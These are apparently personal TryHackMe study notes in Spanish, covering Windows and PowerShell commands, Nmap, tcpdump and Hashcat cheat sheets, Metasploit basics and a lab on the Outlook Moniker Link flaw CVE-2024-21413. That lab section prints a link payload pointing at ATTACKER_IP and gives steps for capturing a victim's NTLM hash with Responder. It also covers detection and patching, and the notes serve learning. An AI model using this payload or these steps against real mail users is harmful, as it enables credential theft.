# TryHackMe Notes

# Windows

**Propósito:** resumen breve y práctico de comandos, utilidades y conceptos vistos en TryHackMe. Uso: chuleta/recordatorio personal, no documentación exhaustiva.

---

## Índice rápido
- Utilidades GUI/MSC
- Monitorización y diagnóstico
- Gestión de usuarios y servicios
- Registro y persistencia
- Networking básico
- Comandos útiles (CLI / PowerShell)
- Herramientas y tips para pentesting / administración
- Buenas prácticas

---

## Utilidades (ejecutar desde Ejecutar / CMD / PowerShell)
`control.exe` — abre el **Panel de control** clásico.

`msconfig` — MSConfig: configurar y diagnosticar el inicio de Windows (habilitar/deshabilitar servicios y programas de arranque, safe boot, opciones de diagnóstico).

`UserAccountControlSettings` — abre la configuración de **UAC** (nivel de notificaciones al instalar o modificar sistema).

`compmgmt.msc` — **Computer Management** (centraliza Task Scheduler, Event Viewer, Shared Folders, Local Users and Groups, Device Manager, Disk Management, Services, WMI).

`lusrmgr.msc` — **Local Users and Groups** (gestión de cuentas y grupos locales).

`perfmon` — **Performance Monitor** (monitorizar CPU/memoria/disco/red; alertas; logs de rendimiento).

`msinfo32` — **System Information**: resumen hardware, componentes, entorno software.

`resmon` — **Resource Monitor**: monitor granular por proceso (CPU, memoria, disco, red).

`regedit` — **Registry Editor**: navegar y modificar el registro; export/import de ramas para backup/despliegue.

`control /name Microsoft.WindowsUpdate` — abre Windows Update en Configuración.

---

# Comandos de Windows

- `set`  
  Muestra, crea o modifica variables de entorno en la sesión actual del CMD.

- `ver`  
  Muestra la versión del sistema operativo.

- `systeminfo`  
  Presenta información detallada del sistema (OS, memoria, adaptadores, hotfixes).

- `more` (con `Spacebar`)  
  Pagina la salida de otro comando; `Space` avanza una pantalla, `Enter` una línea.

- `driverquery`  
  Lista los controladores instalados en el sistema con información básica.

- `help`  
  Muestra ayuda general y lista de comandos disponibles en CMD.

- `cls`  
  Limpia la pantalla del terminal.

- `ipconfig /all`  
  Muestra la configuración IP detallada (MAC, DHCP, DNS, etc.).

- `tracert`  
  Rastrea la ruta de red hasta un host mostrando cada salto.

- `nslookup`  
  Realiza consultas DNS interactivas o directas.

- `netstat -a -b -o -n`  
  Muestra conexiones y puertos:  
  `-a` todas las conexiones, `-b` ejecutable asociado, `-o` PID, `-n` sin resolver nombres.

- `dir /a /s`  
  Lista archivos y carpetas; `/a` incluye archivos ocultos/sistema, `/s` recursivo.

- `tree`  
  Muestra la estructura de directorios en forma de árbol.

- `mkdir`  
  Crea uno o varios directorios.

- `rmdir`  
  Elimina directorios vacíos; `/S` elimina directorios con contenido.

- `type`  
  Muestra el contenido de un archivo de texto.

- `move`  
  Mueve archivos o directorios a otra ubicación.

- `del`  
  Elimina uno o varios archivos.

- `copy`  
  Copia uno o varios archivos a otra ubicación.

- `tasklist /? /FI "..."`  
  Lista procesos en ejecución; `/FI` filtra por condiciones (ej. nombre, PID).

- `taskkill /PID <target>`  
  Finaliza un proceso usando su número de PID.

- `shutdown`  
  Apaga, reinicia o cierra sesión en el sistema (opciones `/s`, `/r`, `/l`, `/t`).


## Monitorización y troubleshooting rápidos
- `taskmgr` — Administrador de tareas (procesos, rendimiento, inicio).
- `perfmon` / `resmon` / `msinfo32` para diagnóstico avanzado.
- `eventvwr.msc` — Visor de eventos (Application, System, Security): revisar errores y eventos relevantes.
- `services.msc` — gestionar servicios (start/stop/startup type).
- `tasklist` / `taskkill /PID <pid> /F` — ver/terminar procesos desde CMD.
- `Process Explorer` (Sysinternals) — reemplazo avanzado de Task Manager (handles, DLLs, árbol de procesos).

---

## Gestión de usuarios y permisos
- `lusrmgr.msc` (GUI) — usuarios y grupos locales.
- `net user` — listar usuarios.
- `net user <usuario>` — ver detalles / modificar contraseñas.
- PowerShell: `Get-LocalUser` / `Get-LocalGroup` / `Add-LocalUser` / `Add-LocalGroupMember` (administración desde PS).

---

## Networking (comandos básicos)
- `ipconfig /all` — configuración IP completa (DHCP, DNS, adaptadores).
- `ping <host>` — comprobación ICMP básica.
- `tracert <host>` — ruta a destino.
- `nslookup <domain>` — consulta DNS interactiva.
- `netstat -ano` — conexiones activas + PID (útil para correlacionar con `tasklist`).
- `route print` — tabla de ruteo local.
- `arp -a` — cache ARP.
- `qwinsta` — sesiones RDP activas.
- `net share` — ver recursos compartidos.

---

## Registro (Registry) y persistencia
- `regedit` — editar registro (export/import .reg).
- Ramas clave: `HKLM\Software`, `HKCU\Software`, `HKLM\SYSTEM\CurrentControlSet\Services`.
- Herramientas: `Autoruns` (Sysinternals) para revisar persistencia en boot/startup.
- Evitar cambios en registro en entornos de producción sin backup: exportar antes (`File -> Export`).

---

## PowerShell: comandos prácticos
- `Get-Process` / `Stop-Process -Id <pid>` — procesos.
- `Get-Service` / `Start-Service` / `Stop-Service` — servicios.
- `Get-EventLog -LogName System -Newest 50` — revisar eventos (legacy).
- `Get-WinEvent` — acceso más completo a logs.
- `Get-NetTCPConnection` — conexiones TCP (en PS 5+ / módulos).
- Ejecutar scripts: `powershell -ExecutionPolicy Bypass -File .\script.ps1` (usar responsablemente).
- `Get-Content` — mostrar contenido de un archivo (similar a `cat`).
- `Set-Location` — cambia el directorio actual (equivalente a `cd`).
- `Get-Command -CommandType "Function"` — lista todas las funciones disponibles en la sesión de PowerShell.
- `Get-Help` — muestra ayuda sobre cmdlets, funciones y scripts, incluyendo parámetros y ejemplos.  
  **Ejemplo:**  
  ```powershell
  # Obtener ayuda básica de un cmdlet
  Get-Help Get-Process

  # Obtener ayuda con ejemplos
  Get-Help Get-Process -Examples

  # Obtener la ayuda completa
  Get-Help Get-Process -Full
  ```
- `Get-Alias` — lista los alias definidos en la sesión de PowerShell (comandos cortos para cmdlets).

- `Get-ChildItem` — lista archivos y directorios (equivalente a ls o dir)

```powershell
  # Listar el contenido del directorio actual
  Get-ChildItem

  # Listar con detalles
  Get-ChildItem -Force

  # Listar archivos recursivamente
  Get-ChildItem -Path C:\ -Recurse

  # Filtrar por extensión
  Get-ChildItem -Path C:\Logs -Filter *.log

  # Buscar archivos recursivamente con un filtro
  Get-ChildItem -Path C:\Users -Filter *.txt -Recurse
```

- `New-Item` — crea un nuevo archivo, carpeta o ítem del sistema.

```powershell
  # Crear una nueva carpeta
  New-Item -Path C:\Temp -ItemType Directory

  # Crear un nuevo archivo vacío
  New-Item -Path C:\Temp\info.txt -ItemType File

  # Crear un archivo con contenido
  New-Item -Path C:\Temp\readme.txt -ItemType File -Value "Hola mundo"

  # Usar variable para ruta
  $ruta = "C:\Logs\hoy.txt"
  New-Item -Path $ruta -ItemType File -Force
  ```

- `Remove-Item` — elimina archivos, carpetas u otros ítems del sistema (similar a `rm` en bash).

  ```powershell
  # Eliminar un archivo
  Remove-Item -Path C:\Temp\info.txt

  # Eliminar una carpeta completa
  Remove-Item -Path C:\Temp\Logs -Recurse

  # Forzar eliminación sin confirmación
  Remove-Item -Path C:\Temp\old -Recurse -Force

  # Eliminar múltiples archivos por filtro
  Remove-Item -Path C:\Temp\*.log
  ```

- `Copy-Item` — copia archivos o carpetas (similar a `cp` en bash).

  ```powershell
  # Copiar un archivo
  Copy-Item -Path C:\Temp\info.txt -Destination C:\Backup\

  # Copiar una carpeta completa
  Copy-Item -Path C:\Temp -Destination C:\Backup -Recurse

  # Sobrescribir si ya existe
  Copy-Item -Path C:\Temp\data.json -Destination C:\Backup\data.json -Force

  # Copiar varios archivos con filtro
  Copy-Item -Path C:\Logs\*.log -Destination C:\Backup\Logs\
  ```

- `Where-Object` — filtra objetos de la salida de un cmdlet según una condición (similar a `grep` o `filter`).
  ```powershell
  # Filtrar procesos con más de 100 MB de memoria
  Get-Process | Where-Object { $_.WorkingSet -gt 100MB }

  # Filtrar servicios detenidos
  Get-Service | Where-Object { $_.Status -eq 'Stopped' }

  # Filtrar archivos con extensión .log
  Get-ChildItem C:\Logs | Where-Object { $_.Extension -eq '.log' }

  # Filtrar usuarios cuyo nombre comience con "adm"
  Get-LocalUser | Where-Object { $_.Name -like 'adm*' }
  ```

- `Select-Object` — selecciona propiedades específicas de objetos o limita la cantidad de resultados.
  ```powershell
  # Mostrar solo el nombre y PID de los procesos
  Get-Process | Select-Object Name, Id

  # Mostrar los primeros 5 procesos
  Get-Process | Select-Object -First 5

  # Mostrar los últimos 3 procesos
  Get-Process | Select-Object -Last 3

  # Renombrar una propiedad en la salida
  Get-Process | Select-Object @{Name="Proceso";Expression={$_.Name}}, Id
  ```

- `Select-String` — busca texto dentro de archivos o cadenas (similar a `grep`).
  ```powershell
  # Buscar la palabra "error" en un archivo de log
  Select-String -Path C:\Logs\app.log -Pattern "error"

  # Buscar múltiples patrones
  Select-String -Path C:\Logs\*.log -Pattern "error","fail"

  # Buscar de forma recursiva en un directorio
  Get-ChildItem -Path C:\Logs -File -Recurse | Select-String -Pattern "timeout"

  # Mostrar solo la línea coincidente
  Get-Content C:\Logs\app.log | Select-String "warning"
  ```

- `Get-ComputerInfo` — obtiene información detallada del sistema, hardware y software.
  ```powershell
  # Mostrar toda la información del sistema
  Get-ComputerInfo

  # Mostrar solo el nombre del equipo y la versión del SO
  Get-ComputerInfo | Select-Object CsName, OsName, OsVersion

  # Filtrar por arquitectura y memoria física
  Get-ComputerInfo | Select-Object OsArchitecture, CsTotalPhysicalMemory
  ```

- `Get-LocalUser` — lista todos los usuarios locales del sistema.
  ```powershell
  # Listar todos los usuarios locales
  Get-LocalUser

  # Mostrar solo usuarios habilitados
  Get-LocalUser | Where-Object { $_.Enabled -eq $true }

  # Buscar un usuario específico
  Get-LocalUser -Name "Administrador"

  # Mostrar nombre y estado de todos los usuarios
  Get-LocalUser | Select-Object Name, Enabled
  ```

- `Get-NetIPConfiguration` — muestra la configuración de red IP de los adaptadores de red.
```powershell
  # Mostrar configuración IP de todos los adaptadores
  Get-NetIPConfiguration

  # Mostrar información de un adaptador específico
  Get-NetIPConfiguration -InterfaceAlias "Ethernet"

  # Mostrar solo dirección IP y máscara de un adaptador
  Get-NetIPConfiguration | Select-Object InterfaceAlias, IPv4Address, IPv6Address, SubnetMask

  # Combinar con Where-Object para filtrar adaptadores habilitados
  Get-NetIPConfiguration | Where-Object { $_.NetAdapter.Status -eq "Up" }
```

- `Get-NetIPAddress` — muestra las direcciones IP configuradas en los adaptadores de red.
  ```powershell
  # Listar todas las direcciones IP
  Get-NetIPAddress

  # Mostrar solo IPv4
  Get-NetIPAddress -AddressFamily IPv4

  # Mostrar solo para un adaptador específico
  Get-NetIPAddress -InterfaceAlias "Ethernet"

  # Filtrar direcciones con Where-Object
  Get-NetIPAddress | Where-Object { $_.IPAddress -like "192.168.*" }

  # Mostrar IP y máscara de subred
  Get-NetIPAddress | Select-Object IPAddress, PrefixLength, InterfaceAlias
```

- `Get-Process` — lista los procesos que se están ejecutando en el sistema.
  ```powershell
  # Listar todos los procesos
  Get-Process

  # Filtrar un proceso específico por nombre
  Get-Process -Name "notepad"

  # Ordenar procesos por uso de memoria
  Get-Process | Sort-Object WorkingSet -Descending

  # Mostrar solo el nombre y PID de los procesos
  Get-Process | Select-Object Name, Id
  ```

- `Get-Service` — lista los servicios del sistema y su estado.
  ```powershell
  # Listar todos los servicios
  Get-Service

  # Mostrar solo servicios en ejecución
  Get-Service | Where-Object { $_.Status -eq 'Running' }

  # Buscar un servicio específico
  Get-Service -Name "wuauserv"

  # Mostrar nombre, estado y tipo de inicio
  Get-Service | Select-Object Name, Status, StartType
  ```

- `Get-NetTCPConnection` — muestra las conexiones TCP activas en el sistema.
  ```powershell
  # Listar todas las conexiones TCP
  Get-NetTCPConnection

  # Filtrar por estado de la conexión
  Get-NetTCPConnection | Where-Object { $_.State -eq "Established" }

  # Filtrar por puerto local específico
  Get-NetTCPConnection | Where-Object { $_.LocalPort -eq 80 }

  # Mostrar solo dirección local, remota y estado
  Get-NetTCPConnection | Select-Object LocalAddress, LocalPort, RemoteAddress, RemotePort, State
  ```

  - `Get-FileHash` — calcula el hash de un archivo (MD5, SHA1, SHA256, etc.) para verificar integridad.
  ```powershell
  # Calcular hash SHA256 de un archivo
  Get-FileHash -Path C:\Temp\archivo.txt

  # Calcular hash MD5 de un archivo
  Get-FileHash -Path C:\Temp\archivo.txt -Algorithm MD5

  # Calcular hash de varios archivos en un directorio
  Get-ChildItem C:\Temp\*.exe | Get-FileHash

  # Mostrar solo el hash
  (Get-FileHash C:\Temp\archivo.txt).Hash
  ```

  - `Invoke-Command` — ejecuta comandos o scripts en equipos locales o remotos mediante PowerShell remoting.
  ```powershell
  # Ejecutar un comando en el equipo local
  Invoke-Command -ScriptBlock { Get-Process }

  # Ejecutar un comando en un equipo remoto
  Invoke-Command -ComputerName "Servidor01" -ScriptBlock { Get-Service }

  # Ejecutar múltiples comandos en un remoto
  Invoke-Command -ComputerName "Servidor01" -ScriptBlock { Get-Process; Get-Service }

  # Usar credenciales para la conexión remota
  $cred = Get-Credential
  Invoke-Command -ComputerName "Servidor01" -ScriptBlock { Get-Process } -Credential $cred
  ```
---

## Herramientas y utilidades recomendadas (mención)
- **Sysinternals Suite** (Process Explorer, Autoruns, ProcMon, PsExec, PsList, Handle) — imprescindible para análisis in situ.
- **Wireshark** — captura y análisis de tráfico de red.
- **TCPView** — visión en tiempo real de conexiones TCP/UDP.
- **Nmap** — escaneo de redes (fuera del host local usar en entornos controlados).
- **Impacket** (Python) — colección para interacción con protocolos MSRPC/SMB (uso responsable).
- **Metasploit Framework** — laboratorio y pruebas en entorno controlado.
- **Mimikatz** — herramienta poderosa para recuperación de credenciales en memoria (alto riesgo; usar solo en entornos legales/educativos).
- **sconfig** (en servidores core) — configuración rápida de Windows Server Core.

---

## Tips prácticos y atajos (rápidos, orientados a seguridad y administración)
- Antes de cambiar registro o políticas, exporta claves o crea un checkpoint (System Restore) si aplica.
- Para correlacionar una conexión sospechosa: `netstat -ano` → identificar PID → `tasklist /FI "PID eq <pid>"` o `Get-Process -Id <pid>`.
- Usar `procmon` (Process Monitor) para ver actividad en tiempo real (registros, archivos, procesos); filtrar por PID/nombre para reducir ruido.
- Para escalado de privilegios en pruebas controladas, revisar tareas programadas (`schtasks /query /fo LIST /v`) y servicios con permisos débiles (`sc qc <service>`).
- Buscar credenciales: revisar **Credential Manager** (`control /name Microsoft.CredentialManager`) y archivos de configuración en perfiles de usuario.
- Evitar ejecutar binarios descargados sin analizar (hash, strings, antivirus).
- En VMs de laboratorio, hacer snapshots antes de pruebas destructivas.

---

## Comandos útiles adicionales (one-liners)
- `netstat -an | find "ESTABLISHED"` — conexiones establecidas (CMD).
- `powershell -command "Get-EventLog -LogName Application -EntryType Error -Newest 20"` — últimos errores.
- `for /f "tokens=5" %a in ('netstat -ano ^| find "ESTABLISHED"') do @echo %a` — extracción rápida de PID (ejemplo CMD).
- `wmic service get name,displayname,pathname,startmode,state` — listado de servicios con detalles (legacy).

---

## Referencias rápidas / próximas expansiones sugeridas
- Añadir sección: **PowerShell avanzado** (remoting, remediación, logs).
- Añadir sección: **Sysinternals cheat-sheet** con comandos y uso básico.
- Añadir ejemplos de `Procmon` y filtros frecuentes.
- Mantener actualizado con nuevas utilidades que aparecen en TryHackMe.

# Search Engine Operators (Google / OSINT Notes)

Todos usamos buscadores, pero pocas veces exprimimos su **poder real**. Los motores de búsqueda (Google, Bing, DuckDuckGo, etc.) permiten consultas avanzadas mediante **operadores**. Estos son especialmente útiles en **OSINT** (Open Source Intelligence) y **reconocimiento pasivo**.

---

## Operadores básicos en Google

- **"frase exacta"**  
  Poner palabras entre comillas fuerza la búsqueda exacta.  
  Ejemplo:  
  `"passive reconnaissance"`

- **site:**  
  Restringe la búsqueda a un dominio o subdominio.  
  Ejemplo:  
  `site:tryhackme.com success stories`

- **- (excluir término)**  
  Excluye resultados que contengan cierta palabra o frase.  
  Ejemplo:  
  `pyramids -tourism`

- **filetype:**  
  Busca archivos en lugar de páginas web. Tipos comunes: PDF, DOC, XLS, PPT.  
  Ejemplo:  
  `filetype:ppt cyber security`

---

## Tips prácticos
- Puedes combinar operadores:  
  `site:gov filetype:pdf "cyber security"`  
- No todos los buscadores soportan los mismos operadores (ejemplo: DuckDuckGo y Bing tienen variaciones).
- Ideal para encontrar **documentos expuestos**, presentaciones, correos, manuales internos o páginas olvidadas.

## Puertos de Servicios

| Protocol | Transport Protocol | Default Port Number |
|-----------|--------------------|---------------------|
| TELNET    | TCP                | 23                  |
| DNS       | UDP or TCP         | 53                  |
| HTTP      | TCP                | 80                  |
| HTTPS     | TCP                | 443                 |
| FTP       | TCP                | 21                  |
| SMTP      | TCP                | 25                  |
| POP3      | TCP                | 110                 |
| IMAP      | TCP                | 143                 |


## tcpdump — Comandos importantes y avanzados

### Uso básico
```bash
sudo tcpdump -i INTERFACE           # capturar en interfaz
sudo tcpdump -i any                 # todas las interfaces
sudo tcpdump -i ens5 -c 100         # capturar 100 paquetes
sudo tcpdump -i ens5 -s 0 -w cap.pcap  # capturar paquetes completos en archivo
tcpdump -r cap.pcap                 # leer archivo pcap
```

### Filtros
- Por host: `host 192.168.1.10`
- Por puerto: `tcp port 80`
- Por red: `net 192.168.1.0/24`
- Por longitud: `greater 100`, `less 200`

### TCP flags
```bash
# Solo SYN
tcpdump 'tcp[tcpflags] == tcp-syn'

# SYN mínimo
tcpdump 'tcp[tcpflags] & tcp-syn != 0'

# SYN o ACK
tcpdump 'tcp[tcpflags] & (tcp-syn|tcp-ack) != 0'
```

### Visualización
| Opción | Descripción |
|--------|------------|
| `-q` | Quick output (información breve) |
| `-e` | Mostrar cabecera link-layer (MAC) |
| `-A` | Mostrar paquete en ASCII |
| `-xx` | Mostrar paquete en hexadecimal |
| `-X` | Mostrar paquete en hexadecimal + ASCII |

```bash
sudo tcpdump -r captura.pcap -q
sudo tcpdump -r captura.pcap -e
sudo tcpdump -r captura.pcap -A
sudo tcpdump -r captura.pcap -xx
sudo tcpdump -r captura.pcap -X
```

### Rotación y tamaño
```bash
sudo tcpdump -i ens5 -s 0 -C 100 -W 10 -w captura-%03d.pcap
```

### Binary operations y header bytes
```bash
# AND bit a bit
ether[0] & 1 != 0   # multicast Ethernet
ip[0] & 0xf != 5    # IP con opciones
```

---

# Nmap — Cheatsheet (rápido)

# Nmap Cheat Sheet

Referencia rápida de opciones comunes de **nmap** para discovery, escaneo de puertos, detección de servicios y performance.

---

## Contenido
- [Escaneo de hosts](#escaneo-de-hosts)
- [Detección de hosts](#detección-de-hosts)
- [Escaneo de puertos](#escaneo-de-puertos)
- [Detección de servicios / OS](#detección-de-servicios--os)
- [Timing / rendimiento](#timing--rendimiento)
- [Salida / reportes](#salida--reportes)
- [Opciones útiles y ejemplos](#opciones-útiles-y-ejemplos)
- [Tips rápidos (CLI / hacking)](#tips-rápidos-cli--hacking)
- [Advertencias legales y operativas](#advertencias-legales-y-operativas)

---

## Escaneo de hosts
| Opción | Descripción |
|---|---|
| `-sL` | List scan — lista targets sin realizar escaneo. |

## Detección de hosts
| Opción | Descripción |
|---|---|
| `-sn` | Ping scan — sólo descubrimiento de hosts (no escanea puertos). |
| `-Pn` | Tratar todos los hosts como online (no enviar pings). Usar con cuidado. |

## Escaneo de puertos
| Opción | Descripción |
|---|---|
| `-sT` | TCP connect scan — completa el three-way handshake (no requiere privilegios especiales). |
| `-sS` | TCP SYN scan — sólo el primer paso del handshake (requerirá privilegios/root para raw sockets). |
| `-sU` | UDP scan — escaneo de puertos UDP. |
| `-F` | Fast mode — escanea los 100 puertos más comunes. |
| `-p [range]` | Especifica rango de puertos. Ej.: `-p-` escanea todos los puertos. |
| `--open` | Mostrar sólo puertos que están abiertos (útil en scripts/filtrado). |

## Detección de servicios / OS
| Opción | Descripción |
|---|---|
| `-O` | Detección de sistema operativo (OS detection). |
| `-sV` | Detección de versión del servicio. |
| `-A` | Detecta OS, versiones y activa scripts adicionales (más ruido y tiempo). |

## Timing / rendimiento
| Opción | Descripción |
|---|---|
| `-T<0-5>` | Plantillas de timing: `0` paranoid, `1` sneaky, `2` polite, `3` normal, `4` aggressive, `5` insane. |
| `--min-parallelism <num>` / `--max-parallelism <num>` | Controla el número mínimo/máximo de probes en paralelo. |
| `--min-rate <num>` / `--max-rate <num>` | Controla la tasa mínima/máxima de paquetes por segundo. |
| `--host-timeout <time>` | Tiempo máximo de espera para un host. |

## Salida / reportes
| Opción | Descripción |
|---|---|
| `-v` / `-vv` / `-v4` | Verbosidad (niveles). |
| `-d` / `-d9` | Debug (niveles). |
| `-oN <file>` | Normal output a archivo. |
| `-oX <file>` | XML output a archivo. |
| `-oG <file>` | Grepable output a archivo. |
| `-oA <basename>` | Output en todos los formatos principales (genera `<basename>.nmap`, `.xml`, `.gnmap`). |

---

## Opciones útiles y ejemplos

### Ejemplos básicos
```bash
# Escaneo rápido de los 100 puertos más comunes en una red
sudo nmap -sS -F 192.168.1.0/24

# Escaneo completo de puertos TCP (0-65535) con detección de servicios y OS, salida en todos los formatos
sudo nmap -sS -p- -A -T4 -oA fullscan_local 192.168.1.10

# Escaneo UDP (más lento y ruidoso; se recomienda privilegios)
sudo nmap -sU -p 53,123 10.0.0.5

# Ping scan para descubrir hosts sin escanear puertos
nmap -sn 10.0.0.0/24

# Tratar hosts como online (ignorar ICMP/ARP/ping filtrados)
sudo nmap -Pn -p 22,80 203.0.113.0/24

# Escaneo con salida "solo abiertos" y verbosidad
sudo nmap --open -sS -p 22,80 -v 192.168.1.0/24
```

### Forzar tasa mínima y máxima (útil en redes lentas o cuando se necesita velocidad)
```bash
sudo nmap --min-rate 100 --max-rate 1000 -p 1-1000 192.168.1.0/24
```

### Limitar tiempo por host
```bash
sudo nmap --host-timeout 30s -p 1-1024 192.168.1.0/24
```

# Hashcat Cheatsheet — Rápido

* `-m <mode>` : modo (ej. `3200` = bcrypt)
* `-a <attack>` : ataque (`0`=dicc, `3`=mask, `6`=hybrid)
* `--example-hashes` : listar modos y ejemplos

Comandos rápidos:

```
hashcat -m 3200 -a 0 hashes.txt /usr/share/wordlists/rockyou.txt
hashcat --show hashes.txt            # mostrar crackeados
cut -d: -f2 cracked.txt              # extraer solo passwords
hashid <hash>                        # identificar modo sugerido
```

---

# Moniker Link (CVE-2024-21413)

Room de TryHackMe sobre una vulnerabilidad de Microsoft Outlook (RCE + fuga de credenciales).

## Introducción
- **Qué es:** vulnerabilidad de Outlook que permite ejecución remota de código (RCE) y filtración de credenciales. Anunciada por Microsoft el 13/02/2024, descubierta por Haifei Li (Check Point Research).
- **Cómo funciona:** evade los mecanismos de seguridad de Outlook al manejar un tipo de hipervínculo llamado **Moniker Link**.
- **Ataque:** el atacante manda un correo con un Moniker Link malicioso. Al hacer clic, Outlook envía al atacante las credenciales **NTLM** del usuario.
- **Puntaje:** CVSS **9.8**, severidad **Critical**, complejidad de ataque baja.
- **Versiones afectadas:**
  - Microsoft Office LTSC 2021: desde 19.0.0
  - Microsoft 365 Apps for Enterprise: desde 16.0.1
  - Microsoft Office 2019: desde 16.0.1
  - Microsoft Office 2016: desde 16.0.0 hasta antes de 16.0.5435.1001

## Cómo funciona la vulnerabilidad
- Outlook renderiza correos como HTML y procesa enlaces HTTP/HTTPS, pero también abre URLs que apuntan a aplicaciones (**Moniker Links**).
- **Protected View (Vista protegida):** abre los correos con adjuntos/enlaces en modo solo lectura y bloquea macros; muestra una advertencia al disparar apps externas.
- Con el Moniker Link `file://` se le pide a Outlook acceder a un archivo en un recurso de red por **SMB** (autentica con credenciales locales). La Vista protegida normalmente **bloquea** esto.
- **El bypass:** agregar el carácter especial `!` más texto al final del enlace evade la Vista protegida:
  ```html
  <a href="file://ATTACKER_IP/test!exploit">Click me</a>
  ```
- El recurso compartido **no necesita existir**: el intento de autenticación se hace igual y se envía el hash **netNTLMv2** de la víctima al atacante.
- El RCE es posible porque los Moniker Links usan **COM** (Component Object Model) en Windows (fuera del alcance de la room; sin PoC público de RCE).

## Explotación (práctica)
1. **Listener SMB** en el AttackBox con Responder (interfaz `ens5`):
   ```bash
   responder -I ens5
   ```
2. Abrir **Outlook** en la máquina vulnerable y cerrar los dos popups de inicio de sesión / clave de producto. El buzón de la víctima ya viene configurado.
3. En el AttackBox, crear `exploit.py` (`nano exploit.py`) con el PoC de CMNatic. El script:
   - Toma email atacante y víctima, y una contraseña (acá `attacker@monikerlink.thm` → `attacker`).
   - Incluye el `html_content` con el Moniker Link como hipervínculo HTML.
   - Envía el correo al servidor SMTP (puerto 25).
4. Ajustar antes de correr:
   - Moniker Link (línea 12) → IP del AttackBox.
   - Placeholder `MAILSERVER` (línea 31) → `MACHINE_IP`.
5. Ejecutar y usar la contraseña `attacker`:
   ```bash
   python3 exploit.py
   ```
   Imprime "Email delivered" si salió bien.
6. En la máquina vulnerable, abrir el correo y hacer clic en "Click me".
7. En la terminal de Responder aparece el hash **netNTLMv2** de la víctima.

## Detección
- **YARA:** regla de Florian Roth (`EXPL_CVE_2024_21413_Microsoft_Outlook_RCE_Feb24`) que detecta correos con el elemento `file:\\` del Moniker Link. Busca cabeceras (`Subject:`, `Received:`) + una regex de rutas `file://` con extensión y el carácter `!`; condición: archivo < 1000 KB.
- **Wireshark:** la petición SMB de la víctima al atacante se ve en la captura, con el hash netNTLMv2 (truncado).

## Mitigación
- **Parche:** Microsoft lo corrigió en el "Patch Tuesday" de febrero de 2024. Actualizar Office vía Windows Update o el Microsoft Update Catalog (buscar el KB según el build de Office).
- **Buenas prácticas para usuarios:**
  - No hacer clic en enlaces aleatorios (sobre todo de correos no solicitados).
  - Previsualizar los enlaces antes de hacer clic.
  - Reenviar los correos sospechosos al área de ciberseguridad.
- **Limitaciones:** como la vulnerabilidad evade la Vista protegida, no se puede reconfigurar Outlook para prevenirla. Bloquear SMB por completo puede ser contraproducente (es necesario para acceder a recursos de red), aunque según la organización se podría bloquear a nivel de firewall.

---

# Metasploit: Introducción

Room de TryHackMe sobre el framework de explotación más usado.

## Introducción
- Metasploit soporta todas las fases de un pentest: desde recolección de información hasta post-explotación.
- **Dos versiones principales:**
  - **Metasploit Pro:** versión comercial, con GUI, que facilita automatización y gestión de tareas.
  - **Metasploit Framework:** versión open-source de línea de comandos. Es la que usa esta room (viene en el AttackBox y en la mayoría de distros de pentesting).
- Sirve para recolección de info, escaneo, explotación, desarrollo de exploits y post-explotación. También para investigación de vulnerabilidades.
- **Componentes principales:**
  - **msfconsole:** la interfaz de línea de comandos principal.
  - **Modules (módulos):** exploits, scanners, payloads, etc.
  - **Tools:** herramientas independientes como `msfvenom`, `pattern_create` y `pattern_offset`. En esta room se cubre `msfvenom`; los otros dos son para desarrollo de exploits (fuera del alcance).

## Módulos
- Se arranca la consola con `msfconsole`. Los **módulos** son componentes que hacen una tarea específica (explotar, escanear, fuerza bruta, etc.).
- **Conceptos clave:**
  - **Exploit:** código que aprovecha una vulnerabilidad del objetivo.
  - **Vulnerabilidad:** fallo de diseño, código o lógica en el objetivo.
  - **Payload:** código que corre en el objetivo para lograr el objetivo del atacante (shell, leer datos, etc.).
- **Categorías de módulos:**
  - **Auxiliary:** soporte (scanners, crawlers, fuzzers).
  - **Encoders:** codifican exploit/payload para evadir antivirus de firmas (éxito limitado).
  - **Evasion:** intentan directamente evadir el antivirus.
  - **Exploits:** organizados por sistema objetivo.
  - **NOPs:** "No Operation" (`0x90` en x86), relleno para tamaños de payload consistentes.
  - **Payloads:** código que corre en el objetivo. Subtipos:
    - **Adapters:** envuelven singles para convertirlos a otro formato (ej. comando PowerShell).
    - **Singles:** autocontenidos, no descargan nada extra.
    - **Stagers:** establecen el canal entre Metasploit y el objetivo (suben un stager pequeño que descarga el resto).
    - **Stages:** lo que descarga el stager; permite payloads más grandes.
  - **Post:** módulos de post-explotación.
- **Single vs staged por el nombre:**
  - `generic/shell_reverse_tcp` → **single/inline** (`_` entre `shell` y `reverse`).
  - `windows/x64/shell/reverse_tcp` → **staged** (`/` entre `shell` y `reverse`).
- En el AttackBox los módulos están en `/opt/metasploit-framework/embedded/framework/modules`.

## msfconsole (comandos principales)
- Se lanza con `msfconsole`; el prompt pasa a `msf6`. Funciona como shell de Linux (`ls`, `ping`, `clear`), pero **no** soporta redirección de salida (`help > help.txt` falla).
- **Comandos útiles:**
  - `help` / `help <comando>` — ayuda general o de un comando.
  - `history` — comandos escritos antes.
  - **Tab** — autocompleta comandos y módulos.
- **Manejo por contexto:** al cambiar de módulo se pierden los parámetros seteados (salvo variables globales con `-g`).
  - `use <módulo>` o `use <número>` — entra al contexto de un módulo. Los comandos de Linux siguen funcionando (no "entrás" a una carpeta).
  - `show options` — parámetros del módulo (ej. exploit pide `RHOSTS`/`RPORT`; módulo post pide `SESSION`).
  - `show <tipo>` — lista módulos (`show payloads` dentro de un exploit lista los compatibles).
  - `back` — sale del contexto.
  - `info` / `info <ruta>` — info detallada (autor, fuentes, descripción).
- **`search`:** busca por CVE, nombre o sistema.
  - Columna **"rank"** = fiabilidad del exploit (uno de rank bajo puede andar; uno excelente puede fallar o tirar el objetivo).
  - Filtros: `search type:auxiliary telnet`, `search cve:2009 type:exploit`, `platform`.
- **EternalBlue (MS17-010):** exploit de SMBv1 atribuido a la NSA, filtrado por Shadow Brokers (abr 2017) y usado en WannaCry (may 2017).

## Parámetros y ejecución de módulos
- Setear parámetros: `set PARAMETER VALUE`. Usar siempre `show options` para ver los requeridos.
- **Los 5 prompts:**
  - `root@...:~#` — sistema normal (sin comandos de Metasploit).
  - `msf6 >` — msfconsole, sin contexto.
  - `msf6 exploit(...) >` — contexto de un módulo.
  - `meterpreter >` — agente Meterpreter cargado en el objetivo.
  - `C:\Windows\system32>` — shell directa en el objetivo.
- Ojo con los valores por defecto (ej. `RPORT 80` cuando el objetivo usa 8080).
- **Parámetros comunes:**
  - `RHOSTS` — IP(s) del objetivo (IP, rango, CIDR o `file:/ruta/targets.txt`).
  - `RPORT` — puerto del objetivo.
